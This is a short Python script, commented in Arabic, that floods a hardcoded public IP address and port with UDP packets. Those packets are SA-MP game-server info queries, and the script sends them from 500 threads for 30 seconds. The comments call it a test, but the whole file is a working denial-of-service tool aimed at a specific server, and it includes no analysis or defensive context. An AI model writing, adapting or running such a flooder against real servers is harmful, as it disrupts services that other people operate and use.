import socket
import threading
import time

# إعدادات الهدف
TARGET_IP = "51.68.107.75"
TARGET_PORT = 16498
DURATION_SEC = 30      # مدة الاختبار بالثواني
NUM_THREADS = 500      # عدد الخيوط المكثفة لأقصى استغلال للمعالج

def max_flood_worker(target, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while running:
            sock.sendto(payload, target)
    except:
        pass
    finally:
        sock.close()

def main():
    global running
    running = True

    target = (TARGET_IP, TARGET_PORT)
    
    # تجهيز البايتات مرة واحدة فقط لتوفير وقت المعالجة
    try:
        ip_parts = list(map(int, TARGET_IP.split('.')))
    except ValueError:
        ip_parts = [127, 0, 0, 1]
        
    payload = b'SAMP'
    for part in ip_parts:
        payload += bytes([part])
    payload += TARGET_PORT.to_bytes(2, 'little')
    payload += b'i'

    print(f"[🔥] MAXIMUM PERFORMANCE FLOOD ENGAGED ON {TARGET_IP}:{TARGET_PORT}")
    print(f"[THREADS] {NUM_THREADS} Threads active | Duration: {DURATION_SEC}s")

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=max_flood_worker, args=(target, payload))
        t.daemon = True
        threads.append(t)
        t.start()

    # تشغيل الاختبار للمدة المحددة ثم إيقاف الخيوط بلطف
    time.sleep(DURATION_SEC)
    running = False

    print("[✓] Test finished. Check server response/status.")

if __name__ == "__main__":
    main()
    